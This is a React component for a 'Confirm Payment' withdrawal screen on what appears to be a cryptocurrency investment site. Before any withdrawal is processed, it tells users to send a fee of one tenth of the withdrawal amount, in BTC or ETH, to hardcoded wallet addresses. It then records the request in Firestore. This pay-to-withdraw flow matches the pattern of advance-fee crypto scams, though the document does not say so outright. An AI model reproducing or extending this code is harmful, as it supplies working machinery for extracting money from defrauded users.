import React, { useState } from 'react';
import { initializeApp } from "firebase/app"
import { firebaseConfig } from "../../database/firebaseConfig";
import { getFirestore, doc, addDoc, collection } from "firebase/firestore";

const WithdrawalPayment = ({setProfileState, withdrawData, bitPrice, ethPrice, currentUser}) => {
    const [copystate, setCopystate] = useState("Copy");

    initializeApp(firebaseConfig);

    const db = getFirestore();

    const colRef = collection(db, "withdrawals");

    const removeErr = () => {
        setTimeout(() => {
            setCopystate("Copy");
        }, 2500);
    }

    const copyToClipboard = (text) => {
        navigator.clipboard.writeText(text)
          .then(() => {
            setCopystate("Copied");
            removeErr()
            console.log('Text copied to clipboard');
          })
          .catch((err) => {
            console.error('Unable to copy text to clipboard', err);
          });
    }

    const handleTransacConfirmation = () => {
        addDoc(colRef, {...withdrawData, date: new Date().toISOString(), widthrawalFee: withdrawData?.paymentOption === "Bitcoin" ? `${Number.parseFloat((withdrawData?.amount / 10)/bitPrice).toFixed(3)} BTC` : `${Number.parseFloat((withdrawData?.amount/10)/ethPrice).toFixed(3)} ETH`, idnum: currentUser?.idnum})
        setProfileState("Withdrawals");
    }
  return (
    <div className="paymentSect">
        <h2>Confirm Payment</h2>
        <div className="mainPaymentSect">
            <h3>Send exactly <span>{withdrawData?.paymentOption === "Bitcoin" ? `${Number.parseFloat((withdrawData?.amount / 10)/bitPrice).toFixed(3)} BTC` : `${Number.parseFloat((withdrawData?.amount/10)/ethPrice).toFixed(3)} ETH`}</span> to</h3>
            <p>{withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"} <span onClick={() => {copyToClipboard(`${withdrawData?.paymentOption === "Bitcoin" ? "bc1q4d5rfgeuq0su78agvermq3fpqtxjczlzhnttty" : "0x1D2C71bF833Df554A86Ad142f861bc12f3B24c1c"}`)}}>{copystate} <i class="icofont-ui-copy"></i></span></p>
        </div>
        <p>Confirm the transaction after the specified amount has been transferred while we complete the transaction process.</p>
        <p>The completion of the transaction process might take between couple minutes to several hours. You can check for the status of your withdrawals in the Withdrawal section of your User-Account-Display-Interface.</p>
        <button type="button" onClick={handleTransacConfirmation}>Confirm Transaction</button>
    </div>
  )
}

export default WithdrawalPayment
